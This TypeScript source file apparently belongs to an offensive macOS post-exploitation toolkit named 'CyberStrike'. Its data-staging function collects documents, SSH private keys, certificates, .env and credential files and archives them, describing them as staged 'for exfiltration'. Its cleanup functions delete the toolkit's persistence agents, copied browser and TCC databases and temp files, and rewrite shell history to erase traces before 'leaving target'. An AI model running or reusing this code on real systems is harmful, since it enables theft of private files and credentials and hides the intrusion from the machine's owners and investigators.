import { run, argVal, hasFlag } from "./shared"
import type { Finding, HookResult } from "./shared"

export async function dataStage(args: string[], timeout: number): Promise<HookResult> {
  const type = argVal(args, "--type") || "all"
  const outputPath = argVal(args, "--output")
  const findings: Finding[] = []
  const output: string[] = ["=== Data Staging ==="]
  const home = process.env.HOME || "/root"
  const allFiles: string[] = []

  if (type === "documents" || type === "all") {
    output.push("\n--- Documents ---")
    const docs = await run(
      "find",
      [
        `${home}/Documents`,
        `${home}/Desktop`,
        "-type",
        "f",
        "(",
        "-name",
        "*.pdf",
        "-o",
        "-name",
        "*.docx",
        "-o",
        "-name",
        "*.xlsx",
        "-o",
        "-name",
        "*.pptx",
        "-o",
        "-name",
        "*.csv",
        ")",
      ],
      timeout,
    )
    if (docs.exitCode === 0 && docs.stdout.trim()) {
      const files = docs.stdout.trim().split("\n").filter(Boolean).slice(0, 30)
      output.push(`[+] Found ${files.length} document(s)`)
      for (const f of files) output.push(`    ${f}`)
      allFiles.push(...files)
    }
  }

  if (type === "keys" || type === "all") {
    output.push("\n--- Keys & Certificates ---")
    const keys = await run(
      "find",
      [
        home,
        "-maxdepth",
        "5",
        "-type",
        "f",
        "(",
        "-name",
        "id_rsa",
        "-o",
        "-name",
        "id_ed25519",
        "-o",
        "-name",
        "*.pem",
        "-o",
        "-name",
        "*.key",
        "-o",
        "-name",
        "*.p12",
        ")",
      ],
      timeout,
    )
    if (keys.exitCode === 0 && keys.stdout.trim()) {
      const files = keys.stdout.trim().split("\n").filter(Boolean).slice(0, 20)
      output.push(`[+] Found ${files.length} key/cert file(s)`)
      for (const f of files) output.push(`    ${f}`)
      allFiles.push(...files)
    }
  }

  if (type === "configs" || type === "all") {
    output.push("\n--- Config & Credential Files ---")
    const configs = await run(
      "find",
      [
        home,
        "-maxdepth",
        "5",
        "-type",
        "f",
        "(",
        "-name",
        ".env",
        "-o",
        "-name",
        "*.conf",
        "-o",
        "-name",
        "config.json",
        "-o",
        "-name",
        "credentials",
        ")",
      ],
      timeout,
    )
    if (configs.exitCode === 0 && configs.stdout.trim()) {
      const files = configs.stdout.trim().split("\n").filter(Boolean).slice(0, 20)
      output.push(`[+] Found ${files.length} config/credential file(s)`)
      for (const f of files) output.push(`    ${f}`)
      allFiles.push(...files)
    }
  }

  if (allFiles.length === 0) {
    output.push("\n[*] No matching files found for staging")
    return { output: output.join("\n"), findings }
  }

  if (outputPath) {
    const tar = await run("tar", ["czf", outputPath, ...allFiles], timeout)
    if (tar.exitCode === 0) {
      const stat = await run("ls", ["-lh", outputPath], timeout)
      output.push(`\n[+] Staged archive: ${outputPath}`)
      output.push(`    ${stat.stdout.trim()}`)
    }
    if (tar.exitCode !== 0) {
      output.push(`\n[!] Archive creation failed: ${tar.stderr.trim()}`)
    }
  }
  if (!outputPath) {
    output.push(`\n[*] ${allFiles.length} files identified — use --output PATH to create archive`)
    for (const f of allFiles.slice(0, 10)) {
      const stat = await run("ls", ["-lh", f], timeout)
      if (stat.exitCode === 0) output.push(`    ${stat.stdout.trim()}`)
    }
  }

  findings.push({
    checkId: "MAC-STAGE-001",
    provider: "macos",
    severity: "high",
    status: "STAGED",
    resource: outputPath || "macos://staged-files",
    title: `Data staging: ${allFiles.length} files identified`,
    details: `${allFiles.length} sensitive files found for exfiltration${outputPath ? ` — archived to ${outputPath}` : ""}`,
    remediation: "Ensure staged archive is removed after exfiltration. Run cleanup_mac before leaving.",
  })

  return { output: output.join("\n"), findings }
}

export async function artifactEnum(_args: string[], timeout: number): Promise<HookResult> {
  const findings: Finding[] = []
  const output: string[] = ["=== CyberStrike Artifact Enumeration ==="]
  const home = process.env.HOME || "/root"
  let total = 0

  output.push("\n--- LaunchAgents/Daemons ---")
  const agentDirs = [`${home}/Library/LaunchAgents`, "/Library/LaunchAgents", "/Library/LaunchDaemons"]
  for (const dir of agentDirs) {
    const find = await run("find", [dir, "-name", "*cyberstrike*", "-o", "-name", "*cs-*"], timeout)
    if (find.exitCode === 0 && find.stdout.trim()) {
      const files = find.stdout.trim().split("\n").filter(Boolean)
      total += files.length
      for (const f of files) output.push(`    [!] ${f}`)
    }
  }

  output.push("\n--- Temp Files ---")
  const tmp = await run(
    "find",
    ["/tmp", "-maxdepth", "1", "(", "-name", "cs-*", "-o", "-name", "cyberstrike-*", ")"],
    timeout,
  )
  if (tmp.exitCode === 0 && tmp.stdout.trim()) {
    const files = tmp.stdout.trim().split("\n").filter(Boolean)
    total += files.length
    for (const f of files) output.push(`    [!] ${f}`)
  }

  output.push("\n--- Running Processes ---")
  const procs = await run("pgrep", ["-fl", "cyberstrike|cs-"], timeout)
  if (procs.exitCode === 0 && procs.stdout.trim()) {
    const lines = procs.stdout.trim().split("\n").filter(Boolean)
    total += lines.length
    for (const p of lines) output.push(`    [!] ${p.trim()}`)
  }

  output.push("\n--- Shell History References ---")
  const histFiles = [`${home}/.zsh_history`, `${home}/.bash_history`]
  for (const hist of histFiles) {
    if (await Bun.file(hist).exists()) {
      const grep = await run("grep", ["-c", "cyberstrike\\|machook", hist], timeout)
      if (grep.exitCode === 0) {
        const count = parseInt(grep.stdout.trim()) || 0
        if (count > 0) {
          output.push(`    [!] ${hist}: ${count} references`)
          total += count
        }
      }
    }
  }

  output.push("\n--- DTrace Scripts ---")
  const dtrace = await run("find", ["/tmp", "-maxdepth", "1", "-name", "*.d"], timeout)
  if (dtrace.exitCode === 0 && dtrace.stdout.trim()) {
    const files = dtrace.stdout.trim().split("\n").filter(Boolean)
    total += files.length
    for (const f of files) output.push(`    [!] ${f}`)
  }

  output.push("\n--- Copied Databases ---")
  const dbs = await run(
    "find",
    [
      "/tmp",
      "-maxdepth",
      "1",
      "(",
      "-name",
      "cs-chrome-*",
      "-o",
      "-name",
      "cs-safari-*",
      "-o",
      "-name",
      "cs-tcc-*",
      ")",
    ],
    timeout,
  )
  if (dbs.exitCode === 0 && dbs.stdout.trim()) {
    const files = dbs.stdout.trim().split("\n").filter(Boolean)
    total += files.length
    for (const f of files) output.push(`    [!] ${f}`)
  }

  output.push(`\n[*] Total artifacts found: ${total}`)
  if (total === 0) output.push("[+] No CyberStrike artifacts detected — target appears clean")

  findings.push({
    checkId: "MAC-ARTIFACT-001",
    provider: "macos",
    severity: "info",
    status: total > 0 ? "FOUND" : "CLEAN",
    resource: "macos://artifacts",
    title: `Artifact enumeration: ${total} artifacts found`,
    details: `${total} CyberStrike artifacts detected across LaunchAgents, temp files, processes, history, and databases`,
    remediation: total > 0 ? "Run cleanup_mac to remove all artifacts before leaving target." : "No cleanup needed.",
  })

  return { output: output.join("\n"), findings }
}

export async function cleanupMac(_args: string[], timeout: number): Promise<HookResult> {
  const findings: Finding[] = []
  const output: string[] = ["[*] Cleaning up CyberStrike artifacts from macOS target...\n"]
  const home = process.env.HOME || "/root"
  let cleaned = 0

  const launchAgentDirs = [`${home}/Library/LaunchAgents`, "/Library/LaunchAgents", "/Library/LaunchDaemons"]
  for (const dir of launchAgentDirs) {
    const find = await run("find", [dir, "-name", "*cyberstrike*", "-o", "-name", "*cs-*"], timeout)
    if (find.exitCode === 0 && find.stdout.trim()) {
      const files = find.stdout.trim().split("\n").filter(Boolean)
      for (const f of files) {
        const label = f.replace(/.*\//, "").replace(".plist", "")
        await run("launchctl", ["unload", f], timeout)
        await run("rm", ["-f", f], timeout)
        output.push(`[+] Removed LaunchAgent: ${f} (unloaded ${label})`)
        cleaned++
      }
    }
  }

  const csProcesses = await run("pgrep", ["-fl", "cyberstrike|cs-hook|cs-monitor"], timeout)
  if (csProcesses.exitCode === 0 && csProcesses.stdout.trim()) {
    const procs = csProcesses.stdout.trim().split("\n").filter(Boolean)
    for (const proc of procs) {
      const pid = proc.split(/\s+/)[0]
      await run("kill", ["-9", pid], timeout)
      output.push(`[+] Killed process: ${proc.trim()}`)
      cleaned++
    }
  }

  const td = process.env.TMPDIR || "/tmp"
  const tmpPatterns = [
    `${td}/cs-*`,
    `${td}/cyberstrike-*`,
    ...(td !== "/tmp" ? ["/tmp/cs-*", "/tmp/cyberstrike-*"] : []),
    `${home}/.cs-*`,
  ]
  for (const pattern of tmpPatterns) {
    const find = await run(
      "find",
      [
        pattern.includes("*") ? pattern.replace(/\/[^/]*\*.*/, "") : pattern,
        "-name",
        pattern.replace(/.*\//, ""),
        "-maxdepth",
        "1",
      ],
      timeout,
    )
    if (find.exitCode === 0 && find.stdout.trim()) {
      const files = find.stdout.trim().split("\n").filter(Boolean)
      for (const f of files) {
        await run("rm", ["-rf", f], timeout)
        output.push(`[+] Removed temp file: ${f}`)
        cleaned++
      }
    }
  }

  const dtraceScripts = await run("find", ["/tmp", "-name", "*.d", "-newer", "/tmp", "-maxdepth", "1"], timeout)
  if (dtraceScripts.exitCode === 0 && dtraceScripts.stdout.trim()) {
    const scripts = dtraceScripts.stdout.trim().split("\n").filter(Boolean)
    for (const s of scripts) {
      await run("rm", ["-f", s], timeout)
      output.push(`[+] Removed DTrace script: ${s}`)
      cleaned++
    }
  }

  const copiedDbs = await run(
    "find",
    ["/tmp", "-name", "cs-chrome-*", "-o", "-name", "cs-safari-*", "-o", "-name", "cs-tcc-*"],
    timeout,
  )
  if (copiedDbs.exitCode === 0 && copiedDbs.stdout.trim()) {
    const dbs = copiedDbs.stdout.trim().split("\n").filter(Boolean)
    for (const db of dbs) {
      await run("rm", ["-f", db], timeout)
      output.push(`[+] Removed copied database: ${db}`)
      cleaned++
    }
  }

  const historyFiles = [".bash_history", ".zsh_history", ".python_history"]
  for (const hist of historyFiles) {
    const histPath = `${home}/${hist}`
    if (await Bun.file(histPath).exists()) {
      const content = await Bun.file(histPath).text()
      const filtered = content
        .split("\n")
        .filter((l) => !l.includes("cyberstrike") && !l.includes("machook") && !l.includes("cs-"))
        .join("\n")
      if (filtered.length !== content.length) {
        await Bun.write(histPath, filtered)
        output.push(`[+] Scrubbed CyberStrike entries from ${hist}`)
        cleaned++
      }
    }
  }

  output.push(`\n[*] Cleanup complete — ${cleaned} artifacts removed`)
  if (cleaned === 0) output.push("[*] No CyberStrike artifacts found — target is clean")

  findings.push({
    checkId: "MAC-CLEANUP-001",
    provider: "macos",
    severity: "info",
    status: "CLEANED",
    resource: "macos://cleanup",
    title: `macOS cleanup: ${cleaned} artifacts removed`,
    details: `Removed ${cleaned} CyberStrike artifacts (LaunchAgents, processes, temp files, DTrace scripts, shell history)`,
    remediation: "Verify no traces remain with: find / -name '*cyberstrike*' 2>/dev/null",
  })

  return { output: output.join("\n"), findings }
}
